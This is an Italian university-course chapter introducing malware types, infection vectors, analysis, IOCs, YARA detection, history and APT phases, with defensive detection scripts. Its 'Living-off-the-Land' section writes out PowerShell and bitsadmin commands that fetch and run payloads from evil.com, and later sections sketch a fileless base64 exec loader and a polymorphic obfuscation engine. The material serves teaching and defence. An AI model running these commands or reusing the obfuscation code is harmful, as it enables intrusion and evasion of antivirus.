# Capitolo 31 - Introduzione al Malware

> **Corso**: Sistemi e Reti 3  
> **Parte**: 9 - Malware e Minacce  
> **Autore**: Prof. Filippo Bilardo

---

## Cos'Ã¨ il Malware?

**Malware** = Malicious Software

Software progettato per:
- Danneggiare sistemi
- Rubare dati
- Prendere controllo
- Spiare utenti

## Categorie Principali

### 1. Virus

Si replica attaccandosi a file eseguibili.

```
File pulito â†’ Virus si copia â†’ File infetto â†’ Esegue payload
```

### 2. Worm

Si auto-replica e diffonde in rete **senza** file host.

**Esempio storico**: WannaCry (2017)
- Exploit EternalBlue (Windows SMB)
- 200.000+ computer infetti
- Ransomware

### 3. Trojan

Sembra legittimo ma contiene codice malevolo.

```
App apparentemente utile â†’ Backdoor nascosta â†’ Accesso remoto
```

### 4. Ransomware

Cifra file e richiede riscatto.

**Processo**:
```
1. Infezione â†’ 2. Cifratura AES/RSA â†’ 3. Richiesta Bitcoin â†’ 4. Chiave decifrazione (forse)
```

### 5. Spyware

Raccoglie informazioni senza consenso:
- Keylogger
- Screen capture
- Tracking web

### 6. Rootkit

Si nasconde nel sistema a livello kernel:
- Invisibile ad antivirus
- Controllo completo sistema
- Difficile da rimuovere

### 7. Adware

Visualizza pubblicitÃ  indesiderata:
- Fastidioso ma meno pericoloso
- PuÃ² tracciare comportamento

## Vettori di Infezione

### 1. Email Phishing

```
Email fasulla â†’ Allegato .doc con macro â†’ Download malware
```

### 2. Drive-by Download

Visita sito compromesso â†’ Exploit browser â†’ Infezione

### 3. USB/Dispositivi

```
USB infetta â†’ AutoRun â†’ Esecuzione malware
```

### 4. Software Craccato

App pirata â†’ Trojan incluso â†’ Installazione

### 5. VulnerabilitÃ  Software

```
Zero-day exploit â†’ RCE â†’ Malware install
```

## Analisi Malware

### Analisi Statica

Esaminare codice **senza** eseguirlo:

```bash
# Hash del file
sha256sum malware.exe

# Stringhe leggibili
strings malware.exe | grep -i "http"

# Analisi PE header (Windows)
readpe malware.exe

# Ricerca su VirusTotal
# https://www.virustotal.com
```

### Analisi Dinamica

Eseguire in ambiente isolato (sandbox):

```python
import os
import subprocess
import hashlib

def analyze_file(filepath):
    """Analisi base di un file sospetto"""
    
    # 1. Calcola hash
    with open(filepath, 'rb') as f:
        file_hash = hashlib.sha256(f.read()).hexdigest()
    
    print(f"SHA-256: {file_hash}")
    
    # 2. Dimensione
    size = os.path.getsize(filepath)
    print(f"Dimensione: {size} byte")
    
    # 3. Stringhe sospette
    result = subprocess.run(['strings', filepath], 
                          capture_output=True, text=True)
    
    suspicious = ['http://', 'cmd.exe', 'powershell', 'bitcoin']
    for line in result.stdout.split('\n'):
        for pattern in suspicious:
            if pattern.lower() in line.lower():
                print(f"âš ï¸  Trovato: {line.strip()}")

# Uso (in ambiente isolato!)
# analyze_file("suspicious.exe")
```

## Indicatori di Compromissione (IOC)

### Hash Files

```python
import hashlib

def get_file_hashes(filepath):
    """Calcola hash multipli per IOC"""
    with open(filepath, 'rb') as f:
        data = f.read()
    
    return {
        'MD5': hashlib.md5(data).hexdigest(),
        'SHA-1': hashlib.sha1(data).hexdigest(),
        'SHA-256': hashlib.sha256(data).hexdigest()
    }

# hashes = get_file_hashes("malware.bin")
```

### Traffico di Rete

```
- IP/Domini C&C (Command and Control)
- User-Agent anomali
- Porte non standard
- Traffico cifrato sospetto
```

### Modifiche Sistema

```
- Chiavi registro Windows modificate
- File in cartelle temporanee
- Processi sconosciuti
- Connessioni rete inaspettate
```

## Protezione

### 1. Prevenzione

```bash
# Aggiornamenti sistema
sudo apt update && sudo apt upgrade

# Antivirus
sudo apt install clamav
sudo freshclam  # Aggiorna definizioni
clamscan -r /home/user  # Scansione
```

### 2. Rilevamento

```python
import psutil
import socket

def monitor_suspicious_connections():
    """Monitora connessioni di rete sospette"""
    
    suspicious_ports = [4444, 5555, 6666, 31337]  # Porte comuni malware
    
    connections = psutil.net_connections(kind='inet')
    
    for conn in connections:
        if conn.status == 'ESTABLISHED':
            if conn.raddr and conn.raddr.port in suspicious_ports:
                print(f"âš ï¸  Connessione sospetta: {conn.raddr.ip}:{conn.raddr.port}")

# Esegui monitoraggio
# monitor_suspicious_connections()
```

### 3. Risposta

```
1. Isola sistema infetto dalla rete
2. Identifica malware (hash, comportamento)
3. Rimuovi (antivirus o reinstallazione)
4. Analizza come Ã¨ entrato
5. Ripristina da backup pulito
6. Cambia password
```

## Sandbox per Test

```bash
# Docker container isolato
docker run -it --rm --network none ubuntu:latest bash

# Firejail (Linux)
firejail --net=none --private ./suspicious_program

# VirtualBox snapshot
# Crea snapshot prima di test â†’ Ripristina dopo
```

## YARA Rules

Per rilevamento pattern malware:

```yara
rule Ransomware_Wannacry
{
    meta:
        description = "Detect WannaCry ransomware"
        author = "Security Team"
    
    strings:
        $s1 = "WNcry@" ascii
        $s2 = ".WNCRYT" ascii
        $s3 = "tasksche.exe" ascii
        $s4 = "@WanaDecryptor@" ascii
    
    condition:
        3 of them
}
```

## Best Practices

### âœ… Difesa

1. **Aggiorna sempre** OS e software
2. **Backup** regolari (offline)
3. **Antivirus** aggiornato
4. **Firewall** attivo
5. **Non aprire** allegati sospetti
6. **Verifica** mittente email
7. **HTTPS** obbligatorio
8. **Password manager**
9. **2FA** ovunque possibile
10. **Formazione** utenti

### âŒ Evita

1. Software pirata
2. Siti non sicuri
3. USB sconosciuti
4. Privilegi admin non necessari
5. Click su link sospetti

---

## Ciclo di Vita del Malware

### 1. Sviluppo
```
Attacker â†’ Scrive codice â†’ Testa in lab â†’ Obfusca â†’ Prepara distribuzione
```

### 2. Distribuzione
- Email phishing
- Exploit kit
- Supply chain attack
- Social engineering

### 3. Infezione
```
Utente esegue â†’ Malware si installa â†’ Ottiene persistenza â†’ Contatta C&C
```

### 4. AttivitÃ  Malevola
- Raccolta dati
- Cifratura file (ransomware)
- Mining cryptocurrency
- DDoS attack

### 5. Scoperta e Rimozione
```
Utente nota anomalie â†’ AV rileva â†’ Analisi â†’ Rimozione â†’ Remediation
```

## Evoluzione del Malware

### Timeline Storica

```
1971 - Creeper (primo virus)
1986 - Brain (primo virus PC)
1988 - Morris Worm
1999 - Melissa (virus email)
2000 - ILOVEYOU
2001 - Code Red, Nimda
2003 - SQL Slammer
2004 - MyDoom
2007 - Storm Worm
2008 - Conficker
2010 - Stuxnet (primo APT industriale)
2013 - CryptoLocker (primo ransomware diffuso)
2014 - Regin (APT sofisticato)
2017 - WannaCry, NotPetya
2020 - Emotet takedown
2021 - Kaseya, Colonial Pipeline
2023+ - Malware AI-powered
```

### Tendenze Moderne

#### 1. Ransomware-as-a-Service (RaaS)
```python
# Modello business ransomware moderno
class RaaS:
    """Ransomware-as-a-Service"""
    
    def __init__(self):
        self.operator = "DarkSide"  # Gang ransomware
        self.affiliates = []  # "Clienti" che usano ransomware
    
    def recruit_affiliate(self):
        """Recluta affiliato"""
        # Forum underground
        # Vetting processo
        # Fornisce ransomware builder
        pass
    
    def revenue_split(self, ransom_amount):
        """Split profitti"""
        operator_cut = ransom_amount * 0.20  # 20% operator
        affiliate_cut = ransom_amount * 0.80  # 80% affiliate
        
        return operator_cut, affiliate_cut

# Esempi RaaS: REvil, DarkSide, LockBit, BlackCat
```

#### 2. Living-off-the-Land (LotL)
```bash
# Usa tool legittimi di sistema (difficile rilevamento)

# PowerShell
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"

# WMI
wmic process call create "cmd.exe /c malicious_command"

# BITSAdmin
bitsadmin /transfer myDownload http://evil.com/malware.exe C:\temp\malware.exe
```

#### 3. Fileless Malware
```python
def fileless_malware():
    """
    Malware che risiede solo in memoria
    Nessun file su disco â†’ Evita AV tradizionale
    """
    
    import base64
    import subprocess
    
    # Payload in memoria (base64 encoded)
    payload_b64 = "aW1wb3J0IG9z..."  # Codice malevolo
    
    # Decodifica e esegue in memoria
    payload = base64.b64decode(payload_b64)
    
    # Esegue direttamente
    exec(payload)
    
    # Persistenza via registry run key (non file)
    # Oppure WMI event subscription

# Esempi: Poweliks, Kovter, Astaroth
```

#### 4. Polymorphic & Metamorphic
```python
import random

def polymorphic_engine(malware_code):
    """
    Engine polimorfico: cambia signature ad ogni infezione
    """
    
    # 1. Cifra payload
    key = random.randint(0, 255)
    encrypted = bytes([b ^ key for b in malware_code])
    
    # 2. Genera decryptor unico
    decryptor_variants = [
        f"for i in range(len(data)): data[i] ^= {key}",
        f"data = [b ^ {key} for b in data]",
        f"import operator; data = list(map(operator.xor, data, [{key}]*len(data)))"
    ]
    decryptor = random.choice(decryptor_variants)
    
    # 3. Aggiungi junk code
    junk_lines = random.randint(10, 100)
    junk = '\n'.join([f"x{i} = {random.randint(0,1000)}" for i in range(junk_lines)])
    
    # 4. Combina
    new_variant = f"{junk}\n{decryptor}\nexec(data)"
    
    return new_variant

# Ogni variante ha hash diverso!
```

## Advanced Persistent Threat (APT)

### Caratteristiche APT

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ APT (Advanced Persistent Threat)           â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ â€¢ Nation-state o gruppi sponsorizzati      â”‚
â”‚ â€¢ Target specifico (spionaggio, sabotaggio)â”‚
â”‚ â€¢ Multi-stage attack                        â”‚
â”‚ â€¢ Persistenza lunga (mesi/anni)            â”‚
â”‚ â€¢ Stealth avanzato                          â”‚
â”‚ â€¢ Custom malware                            â”‚
â”‚ â€¢ Multiple zero-days                        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

### Fasi APT

```python
class APT_Campaign:
    """Campagna APT tipica"""
    
    def __init__(self, target):
        self.target = target
        self.phase = 1
    
    def phase1_reconnaissance(self):
        """Fase 1: Ricognizione"""
        # OSINT, social media, phishing test
        # Mappa infrastruttura target
        pass
    
    def phase2_initial_compromise(self):
        """Fase 2: Compromissione iniziale"""
        # Spear-phishing email executive
        # Watering hole attack
        # Supply chain compromise
        pass
    
    def phase3_establish_foothold(self):
        """Fase 3: Stabilisci foothold"""
        # Installa backdoor
        # Multiple persistence mechanisms
        # Comunicazione C&C criptata
        pass
    
    def phase4_escalate_privileges(self):
        """Fase 4: Escalation privilegi"""
        # Exploit locale
        # Credential dumping (Mimikatz)
        # Pass-the-hash
        pass
    
    def phase5_internal_recon(self):
        """Fase 5: Ricognizione interna"""
        # Mappa rete interna
        # Identifica asset critici
        # Trova admin credentials
        pass
    
    def phase6_lateral_movement(self):
        """Fase 6: Movimento laterale"""
        # PsExec, WMI, RDP
        # Compromette altri host
        # Raggiunge server critici
        pass
    
    def phase7_maintain_presence(self):
        """Fase 7: Mantieni presenza"""
        # Multiple backdoor
        # Rootkit kernel-mode
        # Firmware implant
        pass
    
    def phase8_complete_mission(self):
        """Fase 8: Completa missione"""
        # Exfiltrazione dati (stealth)
        # Sabotaggio (Stuxnet-style)
        # Installazione impianto permanente
        pass

# Esempi APT: APT28 (Fancy Bear), APT29 (Cozy Bear), 
#              Lazarus Group, Equation Group
```

## Detection e Response

### Indicatori Malware

```python
import psutil
import os
import hashlib

def detect_malware_indicators():
    """Cerca indicatori comuni di malware"""
    
    indicators = []
    
    # 1. Processi sospetti
    suspicious_names = ['csrss.exe', 'svchost.exe', 'lsass.exe']
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            name = proc.info['name']
            exe_path = proc.info['exe']
            
            # csrss.exe dovrebbe essere in System32
            if name in suspicious_names:
                if exe_path and 'system32' not in exe_path.lower():
                    indicators.append({
                        'type': 'suspicious_process',
                        'name': name,
                        'path': exe_path,
                        'pid': proc.info['pid']
                    })
        except:
            pass
    
    # 2. Connessioni rete sospette
    suspicious_ports = [4444, 5555, 6666, 31337]
    for conn in psutil.net_connections(kind='inet'):
        if conn.status == 'ESTABLISHED' and conn.raddr:
            if conn.raddr.port in suspicious_ports:
                indicators.append({
                    'type': 'suspicious_connection',
                    'remote_ip': conn.raddr.ip,
                    'remote_port': conn.raddr.port,
                    'local_port': conn.laddr.port
                })
    
    # 3. File in directory sospette
    suspicious_dirs = [
        os.path.join(os.environ.get('TEMP', '/tmp')),
        os.path.join(os.environ.get('APPDATA', ''), 'Microsoft', 'Temp')
    ]
    
    for directory in suspicious_dirs:
        if os.path.exists(directory):
            for file in os.listdir(directory):
                if file.endswith(('.exe', '.dll', '.scr')):
                    filepath = os.path.join(directory, file)
                    indicators.append({
                        'type': 'suspicious_file',
                        'path': filepath,
                        'size': os.path.getsize(filepath)
                    })
    
    return indicators

# Esegui detection
# iocs = detect_malware_indicators()
# print(f"Trovati {len(iocs)} indicatori sospetti")
```

---

## ğŸ”— Collegamenti

- **Successivo**: [Capitolo 31.2 - Tipologie di Malware](31_tipologie_di_malware.md)
- **Successivo**: [Capitolo 32 - Side-Channel Attacks](32_side-channel_attacks.md)
- **Indice**: [Torna all'indice](../00_INDICE.md)

---

## ğŸ“š Riferimenti

### Database e Intelligence
- **MITRE ATT&CK**: https://attack.mitre.org
- **VirusTotal**: https://www.virustotal.com
- **ANY.RUN**: https://any.run (sandbox online)
- **Hybrid Analysis**: https://www.hybrid-analysis.com
- **AlienVault OTX**: https://otx.alienvault.com

### Tool Analisi
- **Ghidra**: https://ghidra-sre.org
- **IDA Pro**: https://hex-rays.com/ida-pro
- **x64dbg**: https://x64dbg.com
- **Radare2**: https://rada.re

### Report e Blog
- **Kaspersky SecureList**: https://securelist.com
- **Malwarebytes Labs**: https://blog.malwarebytes.com
- **Trend Micro Research**: https://www.trendmicro.com/vinfo/us/security/

**Nota**: Analizzare malware richiede competenze avanzate e ambiente isolato. Mai eseguire su sistema principale!
